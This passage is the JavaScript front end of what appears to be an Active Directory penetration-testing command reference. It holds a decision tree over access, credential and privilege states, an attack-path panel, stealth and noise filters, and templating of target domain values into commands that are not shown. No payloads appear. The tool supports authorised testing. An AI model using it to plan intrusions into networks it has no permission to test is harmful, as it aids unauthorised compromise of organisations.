            if (CONFIG[configKey]) el.value = CONFIG[configKey];
        });
    } catch(e) { console.error('Load error:', e); }
}

function saveState() {
    try {
        localStorage.setItem('adEngineStateV4', JSON.stringify(STATE));
        localStorage.setItem('adEngineConfigV4', JSON.stringify(CONFIG));
    } catch(e) {}
}

// STATE MANAGEMENT
// ═══════════════════════════════════════════════════════════════════════════════════════════

function updateState(axis, value) {
    // Toggle off if clicking the already-selected option
    STATE[axis] = (STATE[axis] === value) ? null : value;
    value = STATE[axis];

    // ── Cascading logic ──────────────────────────────────────────────────────
    if (axis === 'identityPresence') {
        if (!value || value === 'none') {
            STATE.credentialType      = 'none';
            STATE.privilegeCapability = 'unauthenticated';
        } else if (value === 'usernames-only') {
            STATE.credentialType      = 'none';
            STATE.privilegeCapability = 'unauthenticated';
        }
        // Having domain user + no explicit cred → at least standard auth
        if (['user-identity','service-account-identity','machine-account-identity'].includes(value)) {
            if (!STATE.privilegeCapability || STATE.privilegeCapability === 'unauthenticated')
                STATE.privilegeCapability = 'authenticated-standard';
        }
    }

    if (axis === 'credentialType') {
        if (!value || value === 'none') {
            STATE.privilegeCapability = 'unauthenticated';
        } else if (value !== 'null-session') {
            // Any real credential means at least standard auth
            if (!STATE.privilegeCapability || STATE.privilegeCapability === 'unauthenticated')
                STATE.privilegeCapability = 'authenticated-standard';
        }
    }

    if (axis === 'accessPosition') {
        if (value === 'internal-auth' || value === 'vpn') {
            if (!STATE.privilegeCapability || STATE.privilegeCapability === 'unauthenticated')
                STATE.privilegeCapability = 'authenticated-standard';
        }
        if (!value || value === 'external') {
            // External → privilege drops back if not manually set
            if (STATE.privilegeCapability === 'authenticated-standard')
                STATE.privilegeCapability = 'unauthenticated';
        }
    }

    if (axis === 'privilegeCapability') {
        // Privilege implies identity
        if (value && value !== 'unauthenticated') {
            if (!STATE.identityPresence || STATE.identityPresence === 'none')
                STATE.identityPresence = 'user-identity';
            if (!STATE.credentialType || STATE.credentialType === 'none')
                STATE.credentialType = 'password';
        }
        // DA/Tier0 → must have domain user identity
        if (['domain-admin-equivalent','tier0-control','has-dcsync-rights'].includes(value)) {
            STATE.identityPresence = 'user-identity';
        }
    }
    // ────────────────────────────────────────────────────────────────────────

    saveState();
    renderStateGrid();
    renderDecisionTree();
    filterAndRender();
}

function updateConfig(key, value) {
    CONFIG[key] = value;
    // Auto-derive BASE_DN from DOMAIN
    if (key === 'DOMAIN' && value) {
        const parts = value.split('.');
        CONFIG.BASE_DN = parts.map(p => 'DC=' + p).join(',');
    }
    // Auto-derive NETWORK from DC_IP
    if (key === 'DC_IP' && value && /^\d+\.\d+\.\d+\.\d+$/.test(value)) {
        CONFIG.NETWORK = value.split('.').slice(0, 3).join('.');
    }
    saveState();
    filterAndRender();
}

function resetAll() {
    Object.keys(STATE).forEach(k => STATE[k] = null);
    Object.keys(CONFIG).forEach(k => CONFIG[k] = '');
    document.querySelectorAll('.config-field input').forEach(i => i.value = '');
    saveState();
    renderStateGrid();
    renderDecisionTree();
    filterAndRender();
}

function setMode(mode) {
    MODE = mode;
    document.getElementById('btnGuided').classList.toggle('active', mode === 'guided');
    document.getElementById('btnExpert').classList.toggle('active', mode === 'expert');
    filterAndRender();
}

function renderStateGrid() {
    const grid = document.getElementById('stateGrid');
    const items = [
        {lbl: 'Access', val: STATE.accessPosition},
        {lbl: 'Identity', val: STATE.identityPresence},
        {lbl: 'Cred Type', val: STATE.credentialType},
        {lbl: 'Privilege', val: STATE.privilegeCapability},
        {lbl: 'OPSEC', val: STATE.opsecPosture},
        {lbl: 'Environment', val: STATE.environmentContext}
    ];
    grid.innerHTML = items.map(i => 
        `<div class="state-row"><span class="lbl">${i.lbl}</span><span class="val ${i.val ? '' : 'unset'}">${i.val || 'Not set'}</span></div>`
    ).join('');
}

function renderDecisionTree() {
    const tree = document.getElementById('decisionTree');
    tree.innerHTML = '';

    // ── Question nodes — ALL nodes always accessible (no sequential lock) ──
    Object.values(AXES).forEach(axis => {
        const isDone   = STATE[axis.id] !== null;
        // highlight the first unanswered axis as "active" but keep all others clickable
        const isActive = !isDone && Object.values(AXES).find(a => STATE[a.id] === null) === axis;

        const node = document.createElement('div');
        // done = green border; active = blue border; available = normal (always clickable)
        node.className = `decision-node ${isDone ? 'done' : ''} ${isActive ? 'active' : 'available'}`;
        node.innerHTML = `
            <div style="display:flex;align-items:center;margin-bottom:8px">
                <span class="node-axis">${axis.axis}</span>
                <span class="node-q" style="font-size:11px;color:${isDone?'var(--text2)':'var(--text)'}">${axis.question}</span>
                ${isDone ? '<span style="margin-left:auto;font-size:10px;color:var(--green)">✓ set</span>' : ''}
            </div>
            <div class="node-opts">
                ${axis.options.map(opt => `
                    <button class="node-opt ${STATE[axis.id] === opt.value ? 'sel' : ''}"
                            onclick="updateState('${axis.id}', '${opt.value}')" title="${opt.label}">
                        ${opt.icon} ${opt.label}
                    </button>
                `).join('')}
            </div>`;
        tree.appendChild(node);
    });

    // ── Only show panels when any state is set ──
    if (!hasAnyState()) return;

    // ── Smart Recommendations panel ─────────────────────────────────────────
    const recs = getSmartRecommendations();
    if (recs.length > 0) {
        const recDiv = document.createElement('div');
        recDiv.className = 'rec-section';
        recDiv.innerHTML = `<div class="rec-hdr">⚡ Next Best Moves</div>`;
        recs.forEach(r => {
            const card = document.createElement('div');
            card.className = 'rec-card';
            card.onclick = () => {
                setPhase(r.filter);
                document.getElementById('phaseTabs').scrollIntoView({behavior:'smooth',block:'nearest'});
            };
            card.innerHTML = `
                <div class="rc-title">${r.title}</div>
                <div class="rc-why">${r.why}</div>
                <div class="rc-meta">
                    <span class="rc-phase">${r.phase}</span>
                    <span class="rc-priority p-${r.priority}">${r.priority === 'high' ? '🔴 Critical' : r.priority === 'med' ? '🟡 Important' : '🟢 Optional'}</span>
                </div>`;
            recDiv.appendChild(card);
        });
        tree.appendChild(recDiv);
    }

    // ── Attack Path panel ────────────────────────────────────────────────────
    const phaseCounts = {};
    COMMANDS.forEach(c => { phaseCounts[c.phase] = (phaseCounts[c.phase] || 0) + 1; });

    const pathDiv = document.createElement('div');
    pathDiv.style.cssText = 'margin-top:14px';
    pathDiv.innerHTML = `<div class="rec-hdr">⚔ Attack Path Status</div>`;

    const grid = document.createElement('div');
    grid.className = 'attack-path';

    PHASES.forEach(p => {
        const s   = getPhaseStatus(p.id);
        const cls = s.ok ? 'ap-active' : 'ap-possible';
        const cnt = phaseCounts[p.id] || 0;
        const row = document.createElement('div');
        row.className = `ap-item ${cls}`;
        row.style.cursor = 'pointer';
        row.title = `Click to filter: ${p.name}`;
        row.onclick = () => {
            setPhase(p.id);
            document.getElementById('phaseTabs').scrollIntoView({behavior:'smooth',block:'nearest'});
        };
        row.innerHTML = `
            <span class="ap-icon">${s.ok ? '✅' : '⏳'} ${p.icon}</span>
            <div class="ap-info">
                <div class="ap-name">${p.name}</div>
                ${!s.ok && s.need ? `<div class="ap-unlock">${s.need}</div>` : ''}
            </div>
            <span class="ap-cnt">${cnt}</span>`;
        grid.appendChild(row);
    });

    pathDiv.appendChild(grid);
    tree.appendChild(pathDiv);
}

function renderPhaseTabs() {
    const tabs = document.getElementById('phaseTabs');
    const phaseCounts = {};
    COMMANDS.forEach(c => {
        phaseCounts[c.phase] = (phaseCounts[c.phase] || 0) + 1;
    });
    
    tabs.innerHTML = `
        <button class="phase-tab ${!currentPhase ? 'active' : ''}" onclick="setPhase(null)">
            All<span class="cnt">${COMMANDS.length}</span>
        </button>
        ${PHASES.map(p => `
            <button class="phase-tab ${currentPhase === p.id ? 'active' : ''}" data-phase="${p.id}" onclick="setPhase('${p.id}')">
                ${p.icon} ${p.name}<span class="cnt">${phaseCounts[p.id] || 0}</span>
            </button>
        `).join('')}
    `;
}

function setPhase(phase) {
    currentPhase = phase;
    renderPhaseTabs();
    filterAndRender();
}

function populateToolFilter() {
    const tools = [...new Set(COMMANDS.map(c => c.tool).filter(Boolean))].sort();
    const select = document.getElementById('filterTool');
    tools.forEach(t => {
        const opt = document.createElement('option');
        opt.value = t;
        opt.textContent = t;
        select.appendChild(opt);
    });
}

// ═══════════════════════════════════════════════════════════════════════════════════════════
// FILTERING
// ═══════════════════════════════════════════════════════════════════════════════════════════

function filterAndRender() {
    const rawSearch   = document.getElementById('searchInput').value.toLowerCase().trim();
    const searchTerms = rawSearch ? rawSearch.split(/\s+/).filter(t => t) : [];
    _adSearchTerms    = searchTerms;
    const osFilter    = document.getElementById('filterOs').value;
    const noiseFilter = document.getElementById('filterNoise').value;
    const authFilter  = document.getElementById('filterAuth').value;
    const toolFilter  = document.getElementById('filterTool').value;

    // Base hard filters (always apply)
    let filtered = COMMANDS.filter(cmd => {
        if (currentPhase && cmd.phase !== currentPhase) return false;
        if (searchTerms.length) {
            const s = `${cmd.title} ${cmd.desc} ${cmd.tool} ${cmd.id} ${cmd.cmd}`.toLowerCase();
            if (!searchTerms.every(t => s.includes(t))) return false;
        }
        if (osFilter    && cmd.os    !== osFilter    && cmd.os !== 'both') return false;
        if (noiseFilter && cmd.noise !== noiseFilter) return false;
        if (authFilter  && cmd.auth  !== authFilter)  return false;
        if (toolFilter  && cmd.tool  !== toolFilter)  return false;
        return true;
    });

    // Relevance pass (guided mode only)
    let active   = filtered;
    let possible = [];

    if (MODE === 'guided' && hasAnyState()) {
        active   = [];
        possible = [];
        filtered.forEach(cmd => {
            const r = getCommandRelevance(cmd);
            if (r.state === 'active')   active.push({cmd, rel: r});
            if (r.state === 'possible') possible.push({cmd, rel: r});
            // 'locked' = skip (hidden)
        });
    } else {
        active = filtered.map(cmd => ({cmd, rel: {state:'active'}}));
    }

    renderCommands(active, possible);
    updateStats(active, possible);
}

function updateStats(active, possible) {
    const total   = COMMANDS.length;
    const matchN  = active.length + possible.length;
    const readyN  = active.filter(({cmd}) => {
        const t = substituteVariables(cmd.cmd);
        return !t.includes('{') && !t.includes('<');
    }).length;
    document.getElementById('statTotal').textContent = total;
    document.getElementById('statMatch').textContent = matchN;
    document.getElementById('statReady').textContent = readyN;
}

function substituteVariables(cmdText) {
    let result = cmdText;
    Object.entries(CONFIG).forEach(([key, value]) => {
        if (value) {
            result = result.replace(new RegExp(`\\{${key}\\}`, 'g'), value);
        }
    });
    return result;
}

function renderCommands(active, possible) {
    possible = possible || [];
    const container = document.getElementById('commandsContainer');

    if (active.length === 0 && possible.length === 0) {
        container.innerHTML = `
            <div class="empty">
                <div class="icon">🔍</div>
                <h3>No Commands Match</h3>
                <p>Adjust your filters or Decision Tree to see available commands.</p>
            </div>`;
        return;
    }

    function buildSection(items, isPossible) {
        if (items.length === 0) return '';
        const byPhase = {};
        items.forEach(({cmd, rel}) => {
            if (!byPhase[cmd.phase]) byPhase[cmd.phase] = [];
            byPhase[cmd.phase].push({cmd, rel});
        });
        let html = '';
        PHASES.forEach(phase => {
            const group = byPhase[phase.id];
            if (!group || group.length === 0) return;
            html += `
                <div style="margin-bottom:24px">
                    <h3 style="color:${isPossible ? 'var(--text3)' : 'var(--red)'};font-size:14px;margin-bottom:12px;text-transform:uppercase;letter-spacing:1px">
                        ${phase.icon} ${phase.name} (${group.length})
                    </h3>
                    <div class="cmd-grid">
                        ${group.map(({cmd, rel}) => renderCommandCard(cmd, rel)).join('')}
                    </div>
                </div>`;
        });
        return html;
    }

    let html = buildSection(active, false);

    if (possible.length > 0) {
        html += `
            <div class="possible-section">
                <div class="possible-header">
                    ⚡ ${possible.length} commands unlock as you progress — complete earlier phases first
                </div>
                ${buildSection(possible, true)}
            </div>`;
    }

    container.innerHTML = html;
}

function renderCommandCard(cmd, rel) {
    rel = rel || {state:'active'};
    const cmdText    = substituteVariables(cmd.cmd);
    const isReady    = !cmdText.includes('{') && !cmdText.includes('<');
    const noiseClass = cmd.noise === 'high' ? 'noisy' : cmd.noise === 'low' ? 'stealthy' : 'moderate';
    const relClass   = rel.state === 'possible' ? 'rel-possible' : '';

    return `
        <div class="cmd-card ${noiseClass} ${relClass}" id="card-${cmd.id}">
            <div class="card-head">
                <div>
                    <div class="card-title">${hlText(cmd.title)}</div>
                    <div class="card-id">${cmd.id}</div>
                </div>
                <div class="card-badges">
                    <span class="badge badge-os-${cmd.os === 'both' ? 'both' : cmd.os}">${cmd.os.toUpperCase()}</span>
                    <span class="badge badge-noise-${cmd.noise}">${cmd.noise.toUpperCase()}</span>
                    <span class="badge badge-auth-${cmd.auth}">${cmd.auth === 'none' ? 'NO CREDS' : 'CREDS'}</span>
                    ${rel.state === 'possible' ? `<span class="badge badge-needs">🔒 ${rel.reason}</span>` : ''}
                </div>
            </div>
            <div class="card-desc">${hlText(cmd.desc)}</div>
            <div class="card-meta"><span class="meta-tag">🔧 ${cmd.tool}</span></div>
            ${cmd.warning ? `<div class="warning-box">⚠️ ${cmd.warning}</div>` : ''}
            <div class="cmd-box">
                <div class="cmd-text">${hlText(cmdText)}</div>
            </div>
            ${cmd.failureIndicators ? `
                <div class="failure-box">
                    <strong>Failure Indicators:</strong> ${Array.isArray(cmd.failureIndicators) ? cmd.failureIndicators.join('; ') : cmd.failureIndicators}
                </div>` : ''}
            ${cmd.notes ? `
                <div class="notes-box">
                    <strong>Notes:</strong> ${cmd.notes}
                </div>` : ''}
            <div class="card-actions">
                <button class="copy-btn" onclick="copyCmd('${cmd.id}')">
                    ${isReady ? '✓ Copy Ready Command' : '📋 Copy (Variables Remain)'}
                </button>
            </div>
        </div>`;
}

function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}

let _adSearchTerms = [];
function hlText(text) {
    if (!text) return '';
    if (!_adSearchTerms.length) return escapeHtml(text);
    let h = escapeHtml(text);
    _adSearchTerms.forEach(t => { h = h.replace(new RegExp('(' + t.replace(/[.*+?^${}()|[\]\\]/g, '\\$&') + ')', 'gi'), '<mark>$1</mark>'); });
    return h;
}

let _adSearchTimer;
function debouncedFilterAndRender() {
    clearTimeout(_adSearchTimer);
    _adSearchTimer = setTimeout(filterAndRender, 120);
}

document.addEventListener('DOMContentLoaded', () => {
    const _adSrchEl = document.getElementById('searchInput');
    if (_adSrchEl) {
        _adSrchEl.addEventListener('keydown', e => { if (e.key === 'Escape') { _adSrchEl.value = ''; filterAndRender(); } });
        document.addEventListener('keydown', e => {
            if (e.key === '/' && document.activeElement !== _adSrchEl && !e.ctrlKey && !e.altKey && !e.metaKey) {
                e.preventDefault(); _adSrchEl.focus(); _adSrchEl.select();
            }
        });
    }
});

function copyCmd(id) {
    const cmd = COMMANDS.find(c => c.id === id);
    if (!cmd) return;
    
    const cmdText = substituteVariables(cmd.cmd);
    
    if (navigator.clipboard && window.isSecureContext) {
        navigator.clipboard.writeText(cmdText).then(() => showCopyFeedback(id));
    } else {
        const textarea = document.createElement('textarea');
        textarea.value = cmdText;
        textarea.style.position = 'fixed';
        textarea.style.left = '-9999px';
        document.body.appendChild(textarea);
        textarea.select();
        document.execCommand('copy');
        document.body.removeChild(textarea);
        showCopyFeedback(id);
    }
}

function showCopyFeedback(id) {
    showToast('✓ Copied!');
    const card = document.getElementById('card-' + id);
    if (card) {
        card.classList.add('copied');
        setTimeout(() => card.classList.remove('copied'), 1500);
    }
}

function showToast(msg) {
    const toast = document.getElementById('toast');
    toast.textContent = msg;
    toast.classList.add('show');
    setTimeout(() => toast.classList.remove('show'), 2000);
}

function exportBash() {
    let script = '#!/bin/bash\n# AD PenTest Variables - Generated by AD Intelligence Engine v4.0\n\n';
    Object.entries(CONFIG).forEach(([k, v]) => {
        if (v) script += `export ${k}="${v}"\n`;
    });
    
    const blob = new Blob([script], {type: 'text/plain'});
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = 'ad-vars.sh';
    a.click();
    URL.revokeObjectURL(url);
    showToast('✓ Exported!');
}

</script>
<button id="theme-toggle-btn" title="Toggle theme (t)">☀</button>

<script>
(function(){
  function setTheme(theme) {
    document.documentElement.setAttribute('data-theme', theme);
    var btn = document.getElementById('theme-toggle-btn');
    if (btn) btn.textContent = theme === 'dark' ? '☀' : '🌙';
    try { localStorage.setItem('mahdiesta-theme', theme); } catch(e) {}
  }
  function toggleTheme() {
    var current = document.documentElement.getAttribute('data-theme') || 'dark';
    setTheme(current === 'dark' ? 'light' : 'dark');
  }
  document.addEventListener('keydown', function(e) {
    if (e.key === 't' || e.key === 'T') toggleTheme();
  });
  var btn = document.getElementById('theme-toggle-btn');
  if (btn) btn.addEventListener('click', toggleTheme);
  var saved = 'dark';
  try { saved = localStorage.getItem('mahdiesta-theme') || 'dark'; } catch(e) {}
  setTheme(saved);
})();
</script>
